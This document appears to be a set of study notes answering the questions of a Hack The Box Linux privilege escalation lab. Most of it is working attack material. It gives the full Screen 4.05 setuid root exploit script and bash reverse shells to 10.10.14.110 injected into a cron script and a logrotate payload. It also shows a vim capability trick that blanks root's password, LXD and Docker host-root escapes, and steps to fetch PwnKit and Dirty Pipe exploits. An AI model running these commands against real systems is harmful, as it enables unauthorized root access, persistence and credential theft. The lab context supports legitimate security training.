# Linux Privilege Escalation

Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.

```bash

sudo find / -type f -exec grep -l 'HTB{' {} + # search within all files for a string

```
What is the latest Python version that is installed on the target? 

```bash

ls /usr/bin/python*

```

Find the WordPress database password. 

```bash

find / -name wp-config.php 2>/dev/null 

cat /var/www/html/wp-config.php | grep 'DB_USER\|DB_PASSWORD'

```

Review the PATH of the htb-student user. What non-default directory is part of the user's PATH? 

```bash

echo $PATH

```

Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer. 

```bash

while read -r line; do echo "$line"; done < flag.txt

```

Find a file with the setuid bit set that was not shown in the section command output (full path to the binary).

```bash

find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null

```


Find a file with the setgid bit set that was not shown in the section command output (full path to the binary). 

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

```

What command can the htb-student user run as root? 
 
```bash
sudo -l

```

# Groups 

Use the privileged group rights of the secaudit user to locate a flag. 

```bash
groups secaudit

find / -type f -group adm 2>/dev/null | xargs ls -l 2>/dev/null | grep adm | grep root

cat /var/log/apache2/access.log | grep -I flag

```

# Capabilities

Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer. 

```bash

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; # find capabilities

getcap /usr/bin/vim.basic # /usr/bin/vim.basic cap_dac_override=eip

echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd #  we can see that the x in that line is gone

cat /etc/passwd | head -n1


```
# Vulnerable Services

Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory. 


```bash
screen -v 

Screen version 4.05.00 (GNU) 10-Dec-16

```
Screen_exploit_POC.sh

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell

```

# Cron Job Abuse

Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory. 


```bash

find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

ls -la /dmz-backups/

wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

./pspy64 -pf -i 1000

cat /dmz-backups/backup.sh

nano /dmz-backups/backup.sh

nc -lvnp 443

```

backup.sh 

``` bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.110/443 0>&1 # add this line


```

# Containers Linux Daemon (LXD)

Escalate the privileges and submit the contents of flag.txt as the answer.

```bash

id # have the lxd

lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz  --alias AlpineV3 # change alias

lxc init AlpineV3 privesc -c security.privileged=true

lxc config device add privesc host-root disk source=/ path=/tmp/root recursive=true # change path

lxc start privesc

lxc exec privesc /bin/sh # see root shell

find / -name flag.txt 2>/dev/null

cat /tmp/root/root/flag.txt

```

# Docker

```bash

find / -name docker.sock 2>/dev/null

docker -H unix:///run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

```

# Logrotate

writeup: https://www.youtube.com/watch?v=krklkDm3mDI

```bash
find / -name logrotate.conf 2>/dev/null

git clone https://github.com/whotwagner/logrotten.git

gcc logrotten.c -o logrotten

echo 'bash -i >& /dev/tcp/10.10.14.110/4443 0>&1' > payload

grep "create\|compress" /etc/logrotate.conf | grep -v "#"

nc -nlvp 9002

./logrotten -p ./payload /tmp/tmp.log

```

# Miscellaneous Techniques

```bash
cat /etc/exports

showmount -e 10.129.2.210

sudo mount -t nfs 10.129.2.210:/tmp /mnt

cp shell /mnt

chmod u+s /mnt/shell

```


# Python Library Hijacking

psuntil.py

```python 
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('cat /root/flag.txt')

```

```bash

grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

sudo /usr/bin/python3 ~/mem_status.py 

```

# Polkit

pkexec - runs a program with the rights of another user or with root rights

```bash

git clone https://github.com/arthepsy/CVE-2021-4034.git

python3 -m http.server 8000

wget http://10.10.14.42:8000/poc.c

gcc -o poc poc.c

```

# Dirty Pipe

- A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. 
- All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability

```bash

uname -r

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

python3 -m http.server 8000

wget http://10.10.14.42:8000/exploit-1.c

gcc -o shell exploit-1.c


```

# skill

